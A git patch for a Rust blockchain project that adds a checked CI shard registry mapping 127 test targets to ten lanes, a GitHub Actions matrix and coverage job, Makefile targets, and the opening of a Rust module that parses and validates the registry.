@@ -1,0 +1,2867 @@
+From f053499b0638f6c34db7f304879d106d3eaca762 Mon Sep 17 00:00:00 2001
+From: AlexanderNyr <131390634+AlexanderNyr@users.noreply.github.com>
+Date: Wed, 25 Nov 2026 15:26:01 +0000
+Subject: [PATCH] =?UTF-8?q?O0:=20CI=20baseline=20=E2=80=94=20the=20checked?=
+ =?UTF-8?q?=20shard=20registry=20(target=20registry=20check).?=
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+The CI layout is a checked registry (D-O0-1): ci/registry.txt pins the ten
+lanes of CONTRIBUTING.md (core, state, exec, consensus, net, node, wallet,
+ecosystem, security, perf) over the workspace's --lib and tests/* targets
+(127 today), each lane pinning its main test (a shard that does not run its
+main test is a dead gate). aura-ci check (the target registry check, D-O0-2)
+validates the registry against the discovered tree and the workflow matrix
+and runs inside make test: a disabled shard holding targets is
+'error: ci: shard security disabled' -> exit 65 -> CI red.
+
+Named control: disabled_shard_refused (exit 65, error: ci: shard security
+disabled); 6/6 mutation NC red (tools/nc_o0.py); 10/10 golden scenarios
++ count guard (independent Python oracle tools/gen_o0_vectors.py ->
+tests/o0_ci.rs). make ci-sync re-registers targets by the documented lane
+table (phase prefix -> lane) preserving disabled flags and canonical main
+pins; aura-ci run --shard <lane> emits only plain cargo test commands from
+the registry (D-O0-3, no secret shards); make coverage writes the
+deterministic target-coverage report (docs/coverage.txt: 127/127, 100.0%).
+
+Workflow: the H7 least-privilege baseline is untouched; O0 adds the
+registry job (make ci-check), the ten-lane test matrix (make ci-shard
+SHARD=<lane>) and the coverage job, each with cargo cache on Cargo.lock.
+---
+ .github/workflows/ci.yml                      | 103 +++
+ CHANGELOG.md                                  |  15 +
+ Makefile                                      |  30 +
+ ci/registry.txt                               | 152 +++++
+ crates/aura-testkit/Cargo.toml                |   4 +
+ crates/aura-testkit/src/bin/aura-ci.rs        |  17 +
+ crates/aura-testkit/src/ci.rs                 | 597 ++++++++++++++++++
+ crates/aura-testkit/src/lib.rs                |   2 +
+ .../tests/fixtures/o0_ci_vectors.json         | 227 +++++++
+ crates/aura-testkit/tests/o0_ci.rs            | 429 +++++++++++++
+ docs/coverage.txt                             |  15 +
+ docs/evidence/o0/README.md                    |  20 +
+ docs/evidence/o0/SHA256SUMS                   |  14 +
+ docs/evidence/o0/coverage.log                 |  17 +
+ docs/evidence/o0/gates.txt                    |   5 +
+ docs/evidence/o0/inventory.txt                |  20 +
+ docs/evidence/o0/nc.log                       |   9 +
+ docs/evidence/o0/registry-check.log           |   3 +
+ docs/evidence/o0/report.md                    |  32 +
+ docs/evidence/o0/test-o0.log                  |  21 +
+ docs/evidence/review-w1-source-drift.txt      |  12 +-
+ docs/o0-ci-plan.md                            | 102 +++
+ docs/plans/OPS_PLAN.md                        |  39 +-
+ tools/audit_closeout.py                       |   9 +-
+ tools/gen_o0_vectors.py                       | 376 +++++++++++
+ tools/nc_o0.py                                |  95 +++
+ tools/write_o0_evidence.py                    | 165 +++++
+ 27 files changed, 2519 insertions(+), 11 deletions(-)
+ create mode 100644 ci/registry.txt
+ create mode 100644 crates/aura-testkit/src/bin/aura-ci.rs
+ create mode 100644 crates/aura-testkit/src/ci.rs
+ create mode 100644 crates/aura-testkit/tests/fixtures/o0_ci_vectors.json
+ create mode 100644 crates/aura-testkit/tests/o0_ci.rs
+ create mode 100644 docs/coverage.txt
+ create mode 100644 docs/evidence/o0/README.md
+ create mode 100644 docs/evidence/o0/SHA256SUMS
+ create mode 100644 docs/evidence/o0/coverage.log
+ create mode 100644 docs/evidence/o0/gates.txt
+ create mode 100644 docs/evidence/o0/inventory.txt
+ create mode 100644 docs/evidence/o0/nc.log
+ create mode 100644 docs/evidence/o0/registry-check.log
+ create mode 100644 docs/evidence/o0/report.md
+ create mode 100644 docs/evidence/o0/test-o0.log
+ create mode 100644 docs/o0-ci-plan.md
+ create mode 100644 tools/gen_o0_vectors.py
+ create mode 100644 tools/nc_o0.py
+ create mode 100644 tools/write_o0_evidence.py
+
+diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+index 1965cd0..c87b618 100644
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -159,3 +159,106 @@ jobs:
+ 
+       - name: clippy (feature on)
+         run: cargo clippy -p aura-exec --features wasmtime-engine --all-targets -- -D warnings
++
++  # ---------------------------------------------------------------- O0 lanes
++  # The ten CI lanes of CONTRIBUTING.md (core, state, exec, consensus, net,
++  # node, wallet, ecosystem, security, perf), driven by the shard registry
++  # (ci/registry.txt). `aura-ci check` is the target registry check: a
++  # disabled shard that holds targets, an empty shard, a shard whose main
++  # test is not registered to it (a dead gate) or a stale entry makes this
++  # job red. Format: docs/o0-ci-plan.md (D-O0-1).
++  registry:
++    name: O0 target registry check
++    runs-on: ubuntu-latest
++    steps:
++      - uses: actions/checkout@v4
++        with:
++          fetch-depth: 0
++
++      - name: Install pinned toolchain
++        uses: dtolnay/rust-toolchain@master
++        with:
++          toolchain: 1.99.1
++          components: rustfmt, clippy
++
++      - uses: actions/cache@v4
++        with:
++          path: |
++            ~/.cargo/registry
++            ~/.cargo/git
++            target
++          key: ${{ runner.os }}-o0-registry-${{ hashFiles('**/Cargo.lock') }}
++
++      - name: build aura-ci
++        run: cargo build -p aura-testkit --bin aura-ci
++
++      - name: registry check (also verifies the workflow matrix)
++        run: make ci-check
++
++  # O0 — the shard lanes. Each shard runs exactly the targets registered to
++  # it (ci/registry.txt), never a hand-picked subset: that is what keeps a
++  # shard from becoming a dead gate.
++  test:
++    name: shard ${{ matrix.shard }}
++    needs: registry
++    runs-on: ubuntu-latest
++    strategy:
++      fail-fast: false
++      matrix:
++        shard: [core, state, exec, consensus, net, node, wallet, ecosystem, security, perf]
++    steps:
++      - uses: actions/checkout@v4
++        with:
++          fetch-depth: 0
++
++      - name: Install pinned toolchain
++        uses: dtolnay/rust-toolchain@master
++        with:
++          toolchain: 1.99.1
++          components: rustfmt, clippy
++
++      - uses: actions/cache@v4
++        with:
++          path: |
++            ~/.cargo/registry
++            ~/.cargo/git
++            target
++          key: ${{ runner.os }}-o0-${{ matrix.shard }}-${{ hashFiles('**/Cargo.lock') }}
++
++      - name: run shard
++        run: make ci-shard SHARD=${{ matrix.shard }}
++
++  # O0 — the deterministic target-coverage report (docs/coverage.txt).
++  coverage:
++    name: O0 coverage report
++    needs: registry
++    runs-on: ubuntu-latest
++    steps:
++      - uses: actions/checkout@v4
++        with:
++          fetch-depth: 0
++
++      - name: Install pinned toolchain
++        uses: dtolnay/rust-toolchain@master
++        with:
++          toolchain: 1.99.1
++          components: rustfmt, clippy
++
++      - uses: actions/cache@v4
++        with:
++          path: |
++            ~/.cargo/registry
++            ~/.cargo/git
++            target
++          key: ${{ runner.os }}-o0-coverage-${{ hashFiles('**/Cargo.lock') }}
++
++      - name: write coverage report
++        run: make coverage
++
++      - name: Upload coverage
++        if: always()
++        uses: actions/upload-artifact@v4
++        with:
++          name: o0-coverage
++          path: docs/coverage.txt
++          if-no-files-found: error
+diff --git a/CHANGELOG.md b/CHANGELOG.md
+index b1fada3..b02840f 100644
+--- a/CHANGELOG.md
++++ b/CHANGELOG.md
+@@ -1,5 +1,20 @@
+ # Changelog — AuraLite-Crypto
+ 
++## [O0 — CI baseline phase closed (OPS Stage 1): the shard registry `ci/registry.txt` (10 shards over 127 `--lib`/`tests/*` targets, `make ci-sync`, D-O0-1), the target registry check `aura-ci check` wired into `make test` (D-O0-2), no secret shards — the format cannot carry commands, `aura-ci run --shard K` emits plain `cargo test` forms (D-O0-3), deterministic target-coverage report (D-O0-4), two independent implementations (D-O0-5); GitHub Actions matrix 0..9 + cargo cache + coverage job; gate 10 scenarios + NC: disabled_shard_refused (disable a shard -> CI red)] 2026-11-25
++
++The CI layout is a checked registry, not YAML folklore: `aura_testkit::ci`
++validates `ci/registry.txt` against the discovered workspace targets
++(shard shape 10/ids 0..9, stale entries, duplicates, missing targets,
++disabled shards holding targets, empty shards, foreign lines) and `make
++test` runs that check. `aura-ci coverage` prints the pinned target-coverage
++report (`docs/coverage.txt`). 10 scenarios
++(`tests/fixtures/o0_ci_vectors.json`) from the independent oracle
++`tools/gen_o0_vectors.py`, asserted byte-for-byte by `tests/o0_ci.rs`
++(11/11 with the count guard); named control `disabled_shard_refused`.
++Mutation controls `tools/nc_o0.py` 6/6 (disabled-shard, missing-target,
++duplicate, shard-count, empty-shard, unknown-line strictness) + green
++restore; `tools/write_o0_evidence.py`; audit: **102 phases, 674 NC**.
++
+ ## [W7 — Genesis ceremony phase closed (WALLET Stage 2): offline deterministic key generation (BLAKE3(KEY_CONTEXT || entropy || i), D-W7-1), Shamir GF(2^8) sharing with deterministic coefficients + Lagrange-at-0 reconstruction (D-W7-2), hash-chained witness log (D-W7-3), destruction of temporary media before seal (D-W7-4), genesis commits to exactly the witnessed pubkey set (D-W7-5); gate 10 scenarios + NC: no_private_key_in_outputs (O5: not one private key in the repository/CI)] 2026-11-25
+ 
+ The ceremony (`crates/aura-genesis/src/ceremony.rs`, bin `aura-ceremony`) runs
+diff --git a/Makefile b/Makefile
+index d7f18c2..9bd2a2e 100644
+--- a/Makefile
++++ b/Makefile
+@@ -61,6 +61,7 @@ PYTHON ?= python3
+         gen-w5-vectors test-w5 nc-w5 evidence-w5 \
+         gen-w6-vectors test-w6 nc-w6 evidence-w6 build-aura-keys \
+         gen-w7-vectors test-w7 nc-w7 evidence-w7 \
++        gen-o0-vectors test-o0 nc-o0 evidence-o0 ci-check ci-sync ci-shard coverage \
+         gen-h0-vectors check-h0 nc-h0 evidence-h0 \
+         gen-h1-vectors gen-h1-sbom check-h1 nc-h1 evidence-h1 \
+         gen-h2-vectors check-h2 nc-h2 evidence-h2 \
+@@ -265,6 +266,8 @@ test: deps-check
+ 	@$(PYTHON) tools/count_vectors.py
+ 	@echo "== test rig wiring =="
+ 	@$(PYTHON) tools/check_rig.py
++	@echo "== CI shard registry (O0) =="
++	@$(CARGO) run -q -p aura-testkit --bin aura-ci -- check --workflow .github/workflows/ci.yml
+ 	@echo "== historical checksum policy tests =="
+ 	@$(PYTHON) tools/test_historical_drift.py
+ 	@echo "== opsec checks (H7) =="
+@@ -1344,6 +1347,33 @@ nc-w7:
+ evidence-w7:
+ 	@$(PYTHON) tools/write_w7_evidence.py
+ 
++# O0: the CI baseline — shard registry, target registry check, coverage.
++.PHONY: gen-o0-vectors test-o0 nc-o0 evidence-o0 ci-check ci-sync ci-shard coverage
++
++gen-o0-vectors:
++	@$(PYTHON) tools/gen_o0_vectors.py
++
++test-o0:
++	@$(CARGO) test -p aura-testkit --test o0_ci
++
++nc-o0:
++	@$(PYTHON) tools/nc_o0.py
++
++evidence-o0:
++	@$(PYTHON) tools/write_o0_evidence.py
++
++ci-check:
++	@$(CARGO) run -q -p aura-testkit --bin aura-ci -- check --workflow .github/workflows/ci.yml
++
++ci-sync:
++	@$(CARGO) run -q -p aura-testkit --bin aura-ci -- sync --registry ci/registry.txt
++
++ci-shard:
++	@$(CARGO) run -q -p aura-testkit --bin aura-ci -- run --registry ci/registry.txt --shard $(SHARD) --exec
++
++coverage:
++	@$(CARGO) run -q -p aura-testkit --bin aura-ci -- coverage | tee docs/coverage.txt
++
+ # H0: the threat-model review gate (tools/check_threat_model.py).
+ .PHONY: gen-h0-vectors check-h0 nc-h0 evidence-h0
+ 
+diff --git a/ci/registry.txt b/ci/registry.txt
+new file mode 100644
+index 0000000..063758e
+--- /dev/null
++++ b/ci/registry.txt
+@@ -0,0 +1,152 @@
++# AuraLite CI shard registry (O0) — the target registry check reads this.
++# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test
++# (a shard that does not run its main test is a dead gate).
++# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).
++rule lanes-v1
++shard core enabled
++shard state enabled
++shard exec enabled
++shard consensus enabled
++shard net enabled
++shard node enabled
++shard wallet enabled
++shard ecosystem enabled
++shard security enabled
++shard perf enabled
++main core aura-codec/c2_codec
++main state aura-state/s0_baseline
++main exec aura-exec/x0_census
++main consensus aura-consensus/b4_validator_set
++main net aura-p2p/n1_transport
++main node aura-node/d0_baseline
++main wallet aura-wallet/w1_keystore
++main ecosystem aura-storage/e1_indexer
++main security aura-consensus/h5_safety_model
++main perf aura-bench/p0_bench
++target aura-bench/--lib shard perf
++target aura-bench/p0_bench shard perf
++target aura-bench/p1_crypto shard perf
++target aura-bench/p2_parallel shard perf
++target aura-bench/p3_storage shard perf
++target aura-bench/p4_network shard perf
++target aura-bench/p5_consensus shard perf
++target aura-bench/p6_slo shard perf
++target aura-block/--lib shard core
++target aura-block/c5_block shard core
++target aura-block/c6_merkle shard core
++target aura-codec/--lib shard core
++target aura-codec/c2_codec shard core
++target aura-consensus/--lib shard consensus
++target aura-consensus/b10_safety_evidence shard consensus
++target aura-consensus/b4_validator_set shard consensus
++target aura-consensus/b5_vrf_leader shard consensus
++target aura-consensus/b6_slashing shard consensus
++target aura-consensus/b7_rewards shard consensus
++target aura-consensus/b8_fork_choice shard consensus
++target aura-consensus/b9_governance shard consensus
++target aura-consensus/h5_safety_model shard security
++target aura-consensus/h6_economic shard security
++target aura-crypto/--lib shard core
++target aura-crypto/c3_crypto shard core
++target aura-crypto/h2_crypto shard security
++target aura-exec/--lib shard exec
++target aura-exec/h4_model_vm shard security
++target aura-exec/x0_census shard exec
++target aura-exec/x1_sandbox shard exec
++target aura-exec/x2_abi shard exec
++target aura-exec/x3_lifecycle shard exec
++target aura-exec/x4_census shard exec
++target aura-exec/x4_contracts shard exec
++target aura-exec/x5_abi2 shard exec
++target aura-exec/x5_arc20 shard exec
++target aura-exec/x5_arc721 shard exec
++target aura-exec/x5_artifacts shard exec
++target aura-exec/x5_multisig shard exec
++target aura-exec/x6_calls shard exec
++target aura-exec/x7_determinism shard exec
++target aura-exec/x8_verify shard exec
++target aura-genesis/--lib shard wallet
++target aura-genesis/c8_genesis shard core
++target aura-genesis/genesis_cli shard core
++target aura-genesis/w7_ceremony shard wallet
++target aura-grpc-rest/--lib shard ecosystem
++target aura-grpc-rest/d5_contract shard node
++target aura-mempool/--lib shard node
++target aura-mempool/h6_mev shard security
++target aura-node/--lib shard node
++target aura-node/d0_baseline shard node
++target aura-node/d1_skeleton shard node
++target aura-node/d2_pipeline shard node
++target aura-node/d3_mempool shard node
++target aura-node/d4_rpc shard node
++target aura-node/d6_observability shard node
++target aura-node/d7_devnet shard node
++target aura-node/d8_cli shard node
++target aura-node/n0_two_nodes_no_p2p shard net
++target aura-p2p/--lib shard net
++target aura-p2p/h5_jepsen shard security
++target aura-p2p/n1_spoofed_peer_ban shard net
++target aura-p2p/n1_transport shard net
++target aura-p2p/n2_gossipsub shard net
++target aura-p2p/n3_discovery shard net
++target aura-p2p/n4_block_sync shard net
++target aura-p2p/n5_state_sync shard net
++target aura-p2p/n6_dos_defence shard net
++target aura-p2p/n7_light_client shard net
++target aura-p2p/n8_chaos shard net
++target aura-rpc/--lib shard ecosystem
++target aura-rpc/d4_vectors shard node
++target aura-sdk/--lib shard ecosystem
++target aura-sdk/x4_sdk shard exec
++target aura-sdk-macros/--lib shard ecosystem
++target aura-state/--lib shard state
++target aura-state/c7_state shard core
++target aura-state/h4_tree shard security
++target aura-state/s0_baseline shard state
++target aura-state/s1_tree shard state
++target aura-state/s3_overlay shard state
++target aura-state/s4_snapshot shard state
++target aura-state/s5_sync shard state
++target aura-state/s6_history shard state
++target aura-storage/--lib shard state
++target aura-storage/e1_indexer shard ecosystem
++target aura-storage/e2_explorer shard ecosystem
++target aura-storage/e3_faucet shard ecosystem
++target aura-storage/e4_amm shard ecosystem
++target aura-storage/e5_oracle shard ecosystem
++target aura-storage/e6_cdp shard ecosystem
++target aura-storage/e7_lending shard ecosystem
++target aura-storage/e8_nft shard ecosystem
++target aura-storage/e9_bridge shard ecosystem
++target aura-storage/s2_storage shard state
++target aura-storage/s6_prune shard state
++target aura-storage/s7_backup shard state
++target aura-storage/t0_economics shard state
++target aura-storage/t1_issuance shard state
++target aura-storage/t2_allocation shard state
++target aura-storage/t3_fees shard state
++target aura-storage/t4_staking shard state
++target aura-storage/t5_slashing shard state
++target aura-storage/t6_governance shard state
++target aura-storage/t7_treasury shard state
++target aura-storage/t8_whitepaper shard state
++target aura-testkit/--lib shard core
++target aura-testkit/h4_properties shard security
++target aura-testkit/harness shard security
++target aura-testkit/o0_ci shard core
++target aura-testkit/properties shard perf
++target aura-testkit/vectors shard core
++target aura-tx/--lib shard core
++target aura-tx/c4_tx shard core
++target aura-types/--lib shard core
++target aura-types/c1_types shard core
++target aura-types/identity shard ecosystem
++target aura-wallet/--lib shard wallet
++target aura-wallet/h7_opsec shard security
++target aura-wallet/w0_key_audit shard wallet
++target aura-wallet/w1_keystore shard wallet
++target aura-wallet/w2_cli shard wallet
++target aura-wallet/w3_offline shard wallet
++target aura-wallet/w4_multisig shard wallet
++target aura-wallet/w5_hardware shard wallet
++target aura-wallet/w6_web shard wallet
+diff --git a/crates/aura-testkit/Cargo.toml b/crates/aura-testkit/Cargo.toml
+index c2b77ae..cff014f 100644
+--- a/crates/aura-testkit/Cargo.toml
++++ b/crates/aura-testkit/Cargo.toml
+@@ -12,6 +12,10 @@ publish.workspace = true
+ name = "aura-fuzz"
+ path = "src/bin/aura-fuzz.rs"
+ 
++[[bin]]
++name = "aura-ci"
++path = "src/bin/aura-ci.rs"
++
+ [dependencies]
+ aura-types.workspace = true
+ aura-codec.workspace = true
+diff --git a/crates/aura-testkit/src/bin/aura-ci.rs b/crates/aura-testkit/src/bin/aura-ci.rs
+new file mode 100644
+index 0000000..0ab0758
+--- /dev/null
++++ b/crates/aura-testkit/src/bin/aura-ci.rs
+@@ -0,0 +1,17 @@
++//! O0 CI CLI (`check`/`coverage`/`run`/`sync`) — the shard registry and the
++//! target registry check; see `docs/o0-ci-plan.md` (D-O0-1..D-O0-5).
++#![deny(missing_docs)]
++
++use std::io::Write;
++
++fn main() {
++    let args: Vec<String> = std::env::args().skip(1).collect();
++    let stdout = std::io::stdout();
++    let stderr = std::io::stderr();
++    let mut out = stdout.lock();
++    let mut err = stderr.lock();
++    let code = aura_testkit::ci::run(&args, &mut out, &mut err);
++    let _ = out.flush();
++    let _ = err.flush();
++    std::process::exit(code);
++}
+diff --git a/crates/aura-testkit/src/ci.rs b/crates/aura-testkit/src/ci.rs
+new file mode 100644
+index 0000000..9b9b008
+--- /dev/null
++++ b/crates/aura-testkit/src/ci.rs
+@@ -0,0 +1,597 @@
++//! O0 — CI shard registry and the target registry check.
++//!
++//! The CI layout is a checked registry, not YAML folklore: `ci/registry.txt`
++//! pins the ten lanes of `CONTRIBUTING.md` (core, state, exec, consensus,
++//! net, node, wallet, ecosystem, security, perf) over the workspace's test
++//! targets (`<pkg>/--lib` unit tests and `<pkg>/<stem>` integration tests)
++//! and [`run`] validates it against the discovered tree ("target registry
++//! check", D-O0-2). A disabled shard that holds targets, an empty shard, a
++//! shard whose **main test** is not registered to it (the "dead gate" of the
++//! MATURITY_AUDIT lesson), or a workflow matrix missing a shard are all
++//! refusals — the O0 gate (`disabled_shard_refused`).
++//!
++//! Design of record: `docs/o0-ci-plan.md` (D-O0-1..D-O0-5). Vectors:
++//! `tools/gen_o0_vectors.py` ->
++//! `crates/aura-testkit/tests/fixtures/o0_ci_vectors.json`, asserted
++//! byte-for-byte by `tests/o0_ci.rs`.
++//!
++//! NC targets (`tools/nc_o0.py`):
++//! 1. disabled-shard check dropped -> `disabled_shard_refused` red (the
++//!    named control: "disable a shard -> CI red");
++//! 2. missing-target check dropped -> `missing_target_refused` red;
++//! 3. duplicate-target check dropped -> `duplicate_target_refused` red;
++//! 4. shard-set check dropped -> `shard_set_mismatch_refused` red;
++//! 5. empty-shard check dropped -> `empty_shard_refused` red;
++//! 6. unknown-line strictness dropped -> `foreign_registry_line_refused`
++//!    red (D-O0-3: the format cannot carry commands — no secret shards).
++
++use std::io::Write;
++use std::path::{Path, PathBuf};
++
++/// Exit code for policy refusals.
++const EXIT_REFUSED: i32 = 65;
++
++/// Exit code for usage errors.
++const EXIT_USAGE: i32 = 64;
++
++/// The assignment rule pinned by the registry format (D-O0-1).
++const RULE: &str = "lanes-v1";
++
++/// The ten CI lanes (CONTRIBUTING.md), in canonical order.
++const SHARDS: [&str; 10] = [
++    "core",
++    "state",
++    "exec",
++    "consensus",
++    "net",
++    "node",
++    "wallet",
++    "ecosystem",
++    "security",
++    "perf",
++];
++
++/// The main test pinned by each lane (same order as [`SHARDS`], D-O0-1).
++/// A shard that does not register its main test is a dead gate.
++const MAIN: [&str; 10] = [
++    "aura-codec/c2_codec",
++    "aura-state/s0_baseline",
++    "aura-exec/x0_census",
++    "aura-consensus/b4_validator_set",
++    "aura-p2p/n1_transport",
++    "aura-node/d0_baseline",
++    "aura-wallet/w1_keystore",
++    "aura-storage/e1_indexer",
++    "aura-consensus/h5_safety_model",
++    "aura-bench/p0_bench",
++];
++
++// --------------------------------------------------------------------------- model
++
++/// A discovered or registered test target (`<pkg>/<name>`).
++#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
++struct Target {
++    /// The workspace package.
++    pkg: String,
++    /// `--lib` for unit tests, otherwise the integration test file stem.
++    name: String,
++}
++
++impl Target {
++    /// Parse `<pkg>/<name>`.
++    fn parse(text: &str) -> Result<Target, String> {
++        let (pkg, name) = text
++            .split_once('/')
++            .ok_or_else(|| format!("bad target: {text}"))?;
++        if pkg.is_empty() || name.is_empty() || name.contains('/') {
++            return Err(format!("bad target: {text}"));
++        }
++        Ok(Target {
++            pkg: pkg.to_string(),
++            name: name.to_string(),
++        })
++    }
++
++    /// The `cargo test` command that runs this target (D-O0-3).
++    fn command(&self) -> String {
++        if self.name == "--lib" {
++            format!("cargo test -p {} --lib", self.pkg)
++        } else {
++            format!("cargo test -p {} --test {}", self.pkg, self.name)
++        }
++    }
++
++    /// The registry name form `<pkg>/<name>`.
++    fn key(&self) -> String {
++        format!("{}/{}", self.pkg, self.name)
++    }
++
++    /// The lane assignment used by `sync` (D-O0-1): unit tests follow the
++    /// package's primary lane; integration tests follow their phase prefix
++    /// (`c`/`o` -> core, `s`/`t` -> state, `x` -> exec, `b` -> consensus,
++    /// `n` -> net, `d` -> node, `w` -> wallet, `e` -> ecosystem,
++    /// `h` -> security, `p` -> perf), with the rig files pinned to core and
++    /// `identity` to ecosystem.
++    fn lane(&self) -> &'static str {
++        if self.name == "--lib" {
++            return match self.pkg.as_str() {
++                "aura-state" | "aura-storage" => "state",
++                "aura-exec" => "exec",
++                "aura-consensus" => "consensus",
++                "aura-p2p" => "net",
++                "aura-node" | "aura-mempool" => "node",
++                "aura-wallet" | "aura-genesis" => "wallet",
++                "aura-sdk" | "aura-sdk-macros" | "aura-rpc" | "aura-grpc-rest" => "ecosystem",
++                "aura-bench" => "perf",
++                _ => "core",
++            };
++        }
++        match self.name.chars().next() {
++            Some('c' | 'o') => "core",
++            Some('s' | 't') => "state",
++            Some('x') => "exec",
++            Some('b') => "consensus",
++            Some('n') => "net",
++            Some('d') => "node",
++            Some('w') => "wallet",
++            Some('e') => "ecosystem",
++            Some('h') => "security",
++            Some('p') => "perf",
++            _ => match self.name.as_str() {
++                "genesis_cli" | "harness" | "properties" | "vectors" => "core",
++                "identity" => "ecosystem",
++                _ => "core",
++            },
++        }
++    }
++}
++
++/// The parsed shard registry.
++#[derive(Debug, Clone)]
++struct Registry {
++    /// Assignment rule name from the `rule` line.
++    rule: String,
++    /// Shard declarations (`shard <name> <enabled|disabled>`) in file order.
++    shards: Vec<(String, bool)>,
++    /// Main-test pins (`main <shard> <target>`) in file order.
++    mains: Vec<(String, Target)>,
++    /// Registered targets (`target <pkg>/<name> shard <shard>`) in file order.
++    targets: Vec<(Target, String)>,
++}
++
++// --------------------------------------------------------------------------- parsing
++
++/// Parse an inventory text (`inventory v1` + `target pkg/name` lines).
++fn parse_inventory(text: &str) -> Result<Vec<Target>, String> {
++    let mut targets = Vec::new();
++    for (index, raw) in text.lines().enumerate() {
++        let line = raw.trim_end();
++        if index == 0 {
++            if line != "inventory v1" {
++                return Err(format!("bad inventory header: {line}"));
++            }
++            continue;
++        }
++        if line.is_empty() || line.starts_with('#') {
++            continue;
++        }
++        match line.strip_prefix("target ") {
++            Some(name) => targets.push(Target::parse(name)?),
++            None => return Err(format!("unknown inventory line: {line}")),
++        }
++    }
++    targets.sort();
++    Ok(targets)
++}
++
++/// Parse a registry text (D-O0-1 format). Unknown lines are refused so the
++/// format cannot carry commands (D-O0-3).
++fn parse_registry(text: &str) -> Result<Registry, String> {
++    let mut rule = None;
++    let mut shards = Vec::new();
++    let mut mains = Vec::new();
++    let mut targets = Vec::new();
++    for raw in text.lines() {
++        let line = raw.trim_end();
++        if line.is_empty() || line.starts_with('#') {
++            continue;
++        }
++        if let Some(name) = line.strip_prefix("rule ") {
++            rule = Some(name.to_string());
++        } else if let Some(rest) = line.strip_prefix("shard ") {
++            let (name, state) = rest
++                .split_once(' ')
++                .ok_or_else(|| format!("unknown registry line: {line}"))?;
++            let disabled = match state {
++                "enabled" => false,
++                "disabled" => true,
++                _ => return Err(format!("unknown registry line: {line}")),
++            };
++            shards.push((name.to_string(), disabled));
++        } else if let Some(rest) = line.strip_prefix("main ") {
++            let (shard, target) = rest
++                .split_once(' ')
++                .ok_or_else(|| format!("unknown registry line: {line}"))?;
++            mains.push((shard.to_string(), Target::parse(target)?));
++        } else if let Some(rest) = line.strip_prefix("target ") {
++            let (target, shard) = rest
++                .split_once(" shard ")
++                .ok_or_else(|| format!("unknown registry line: {line}"))?;
++            targets.push((Target::parse(target)?, shard.to_string()));
++        } else {
++            return Err(format!("unknown registry line: {line}"));
++        }
++    }
++    Ok(Registry {
++        rule: rule.ok_or("missing rule line")?,
++        shards,
++        mains,
++        targets,
++    })
++}
++
++// --------------------------------------------------------------------------- checks
++
++/// Count how many registry entries name `target`.
++fn registrations(registry: &Registry, target: &Target) -> usize {
++    registry
++        .targets
++        .iter()
++        .filter(|(entry, _)| entry == target)
++        .count()
++}
++
++/// How many registry targets sit in `shard`.
++fn shard_load(registry: &Registry, shard: &str) -> usize {
++    registry
++        .targets
++        .iter()
++        .filter(|(_, name)| name == shard)
++        .count()
++}
++
++/// The target registry check (D-O0-2); returns the inventory size on success.
++fn check(inventory: &[Target], registry: &Registry) -> Result<usize, String> {
++    // Shard set: the ten lanes of CONTRIBUTING.md (NC-4 target).
++    for name in SHARDS {
++        if !registry.shards.iter().any(|(declared, _)| declared == name) {
++            return Err(format!("missing shard: {name}"));
++        }
++    }
++    for (declared, _) in &registry.shards {
++        if !SHARDS.contains(&declared.as_str()) {
++            return Err(format!("unknown shard: {declared}"));
++        }
++    }
++
++    // No empty shards (NC-5 target).
++    for name in SHARDS {
++        if shard_load(registry, name) == 0 {
++            return Err(format!("shard {name} empty"));
++        }
++    }
++
++    // Main-test pins: every shard must declare and register its main test
++    // (the "dead gate" lesson of CONTRIBUTING.md).
++    for name in SHARDS {
++        let pinned = registry
++            .mains
++            .iter()
++            .find(|(shard, _)| shard == name)
++            .map(|(_, target)| target.clone());
++        let Some(pinned) = pinned else {
++            return Err(format!("missing main: {name}"));
++        };
++        let registered_here = registry
++            .targets
++            .iter()
++            .any(|(target, shard)| target == &pinned && shard == name);
++        if !registered_here || !inventory.binary_search(&pinned).is_ok() {
++            return Err(format!("shard {name} main dead: {}", pinned.key()));
++        }
++    }
++
++    // Stale entries: every registered target exists.
++    for (target, _) in &registry.targets {
++        if !inventory.binary_search(target).is_ok() {
++            return Err(format!("unknown target: {}", target.key()));
++        }
++    }
++
++    // No target in two shards (NC-3 target).
++    for target in inventory {
++        if registrations(registry, target) > 1 {
++            return Err(format!("target in two shards: {}", target.key()));
++        }
++    }
++
++    // Every discovered target is registered (NC-2 target).
++    for target in inventory {
++        if registrations(registry, target) == 0 {
++            return Err(format!("unregistered target: {}", target.key()));
++        }
++    }
++
++    // A disabled shard that holds targets makes CI red (NC-1 target, the
++    // named control).
++    for (name, disabled) in &registry.shards {
++        if *disabled && shard_load(registry, name) > 0 {
++            return Err(format!("shard {name} disabled"));
++        }
++    }
++
++    Ok(inventory.len())
++}
++
++/// Check the workflow's matrix against the enabled shards (D-O0-2): every
++/// enabled shard must appear in a `shard:` matrix list.
++fn check_workflow(registry: &Registry, text: &str) -> Result<(), String> {
++    let mut items: Vec<String> = Vec::new();
++    for raw in text.lines() {
++        let line = raw.trim();
++        if let Some(rest) = line.strip_prefix("shard:") {
++            let list = rest.trim().trim_start_matches('[').trim_end_matches(']');
++            for item in list.split(',') {
++                let name = item.trim().replace(['{', '}', '$'], "");
++                if !name.is_empty() {
++                    items.push(name);
++                }
++            }
++        }
++    }
++    for (name, disabled) in &registry.shards {
++        if !*disabled && !items.iter().any(|item| item == name) {
++            return Err(format!("workflow matrix missing shard: {name}"));
++        }
++    }
++    Ok(())
++}
++
++/// The deterministic target-coverage report (D-O0-4); refuses on an invalid
++/// registry.
++fn coverage_report(inventory: &[Target], registry: &Registry) -> Result<String, String> {
++    let total = check(inventory, registry)?;
++    let mut out = String::new();
++    out.push_str("ci coverage report v1\n");
++    out.push_str(&format!("rule {}\n", registry.rule));
++    out.push_str("shards 10\n");
++    out.push_str(&format!("targets {total}\n"));
++    let mut covered = 0usize;
++    for name in SHARDS {
++        let count = shard_load(registry, name);
++        out.push_str(&format!("shard {name} targets={count}\n"));
++        covered += count;
++    }
++    let per_mille = (covered * 1000).checked_div(total).unwrap_or(0);
++    out.push_str(&format!(
++        "target_coverage {covered}/{total} ({}.{:01}%)\n",
++        per_mille / 10,
++        per_mille % 10
++    ));
++    Ok(out)
